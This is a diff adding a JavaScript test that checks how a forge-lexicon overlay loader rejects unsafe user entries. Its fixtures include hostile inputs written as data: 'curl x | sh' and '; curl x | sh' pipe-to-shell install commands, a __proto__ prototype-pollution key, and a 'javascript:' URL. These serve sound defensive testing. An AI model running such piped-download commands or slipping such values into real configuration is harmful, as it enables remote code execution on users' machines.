@@ -142,6 +142,60 @@ test('an overlay adds words', () => {
   fs.rmSync(root, { recursive: true, force: true });
 });
 
+// R013: an overlay may add a self-hosted host's kind, a kind's CLI and its install line; any other new key is named.
+const R013_OVERLAY = { hints: { kinds: { 'git.acme.example': 'gitlab', 'bad.example': 'nonsense' }, clis: { bitbucket: 'bb' }, install: { bb: { how: 'https://bb.example' } } }, nouns: { deployment: ['deploy'] } };
+function lexWith(overlay) {
+  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'forge-lex-'));
+  fs.mkdirSync(path.join(root, '.alfred'), { recursive: true });
+  fs.writeFileSync(path.join(root, '.alfred', 'forge-lexicon.json'), typeof overlay === 'string' ? overlay : JSON.stringify(overlay));
+  try { return forge.loadLexicon(root, {}); } finally { fs.rmSync(root, { recursive: true, force: true }); }
+}
+test('R013: the overlay may add a self-hosted host, a CLI and its install line; nothing else new', () => {
+  // __proto__ written as text: JSON.parse makes it an own key, as a hand-written overlay would
+  const lex = lexWith(JSON.stringify(R013_OVERLAY).replace('"bad.example"', '"__proto__":"gitlab","bad.example"'));
+  assert.strictEqual(lex.hints.kinds['git.acme.example'], 'gitlab');
+  assert.strictEqual(lex.hints.clis.bitbucket, 'bb');
+  assert.strictEqual(lex.hints.install.bb.how, 'https://bb.example');
+  assert.ok(!('deployment' in lex.nouns));
+  assert.strictEqual(Object.getPrototypeOf(lex.hints.kinds), Object.prototype);
+  assert.match(lex.notice, /ignored: .*hints\.kinds\.bad\.example \(not a known kind\)/);
+  assert.match(lex.notice, /hints\.kinds\.__proto__/);
+  assert.match(lex.notice, /nouns\.deployment/);
+  const base = lexWith({});
+  const arr = lexWith({ hints: ['x'] });
+  assert.match(arr.notice, /ignored: hints$/);
+  assert.deepStrictEqual(arr.hints, base.hints);
+  const evil = lexWith({ hints: { install: { bb2: { how: 'https://bb.example', brew: 'evil/tap/bb', after: ['curl x | sh'] } } } });
+  assert.deepStrictEqual(evil.hints.install.bb2, { how: 'https://bb.example' });
+  assert.match(evil.notice, /hints\.install\.bb2\.brew \(not a formula name\)/);
+  assert.match(evil.notice, /hints\.install\.bb2\.after \(after is not taken from an overlay\)/);
+  const az = lexWith({ hints: { install: { az: { after: ['; curl x | sh'] } } } });
+  assert.deepStrictEqual(az.hints.install.az.after, base.hints.install.az.after, 'an existing entry\'s after is not appended to either');
+  assert.match(az.notice, /hints\.install\.az\.after \(after is not taken from an overlay\)/);
+  const js = lexWith({ hints: { install: { bb3: { how: 'javascript:x' } } } });
+  assert.ok(!('bb3' in js.hints.install));
+  assert.match(js.notice, /hints\.install\.bb3 \(how is no https URL\)/);
+  // length bounds: at, one under and one over
+  for (const [n, kept] of [[63, true], [64, true], [65, false]]) {
+    const b = lexWith({ hints: { install: { bbx: { how: 'https://bb.example', brew: 'a'.repeat(n) } } } });
+    assert.strictEqual(b.hints.install.bbx.brew === 'a'.repeat(n), kept, `brew ${n}`);
+    if (!kept) assert.match(b.notice, /hints\.install\.bbx\.brew \(not a formula name\)/);
+    const c = lexWith({ hints: { clis: { bitbucket: 'a'.repeat(n) } } });
+    assert.strictEqual(c.hints.clis.bitbucket === 'a'.repeat(n), kept, `cli ${n}`);
+    if (!kept) assert.match(c.notice, /hints\.clis\.bitbucket \(not a CLI name\)/);
+    const k = lexWith({ hints: { install: { ['a'.repeat(n)]: { how: 'https://bb.example' } } } });
+    assert.strictEqual('a'.repeat(n) in k.hints.install, kept, `install key ${n}`);
+    if (!kept) assert.match(k.notice, /\(not a CLI name\)/);
+  }
+  for (const [n, kept] of [[252, true], [253, true], [254, false]]) {
+    const h = lexWith({ hints: { kinds: { ['a'.repeat(n)]: 'gitlab' } } });
+    assert.strictEqual(h.hints.kinds['a'.repeat(n)] === 'gitlab', kept, `host ${n}`);
+    if (!kept) assert.match(h.notice, /\(not a host name\)/);
+  }
+  assert.strictEqual(lexWith({ verbs: { merge: ['landit'] }, hints: { mcpLaunch: ['my-forge-mcp'] } }).notice, null, 'words under existing keys: no notice');
+  assert.strictEqual(lexWith({ _note: 'my additions', verbs: { merge: ['landit'] } }).notice, null, 'a _ comment key is no unread key');
+});
+
 test('a branch, tag, file or release on a server that is no forge is not a forge call', () => {
   for (const [server, tool, input] of [
     ['supabase', 'create_branch', { project_id: 'abcd', name: 'dev' }],
